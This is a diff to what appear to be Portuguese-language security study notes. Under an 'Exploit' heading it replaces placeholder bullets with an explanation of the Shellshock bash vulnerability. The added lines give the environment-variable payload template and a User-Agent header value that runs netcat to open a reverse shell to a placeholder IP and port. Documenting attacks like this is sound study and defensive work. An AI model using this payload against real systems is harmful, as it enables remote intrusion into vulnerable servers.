@@ -17,10 +17,9 @@
 
 ## Exploit
 
-- item1
-- item2
-- item3
-- item4
+- Para realizar este ataque, deve ser atribuído um valor específico a uma variável de ambiente ou um cabeçalho de um pedido HTTP.
+- O valor deve ser `"() { :; }; {cmd}"` onde `{cmd}` é substitúido pelos comandos a serem corridos na bash.
+- Fazendo um pedido HTTP, atribuindo ao `User-Agent` o valor acima com `/bin/nc -e /bin/sh {ip} {port}`, conseguimos o acesso a uma reverse shell através do comando netcat.
 
 ## Ataques
 
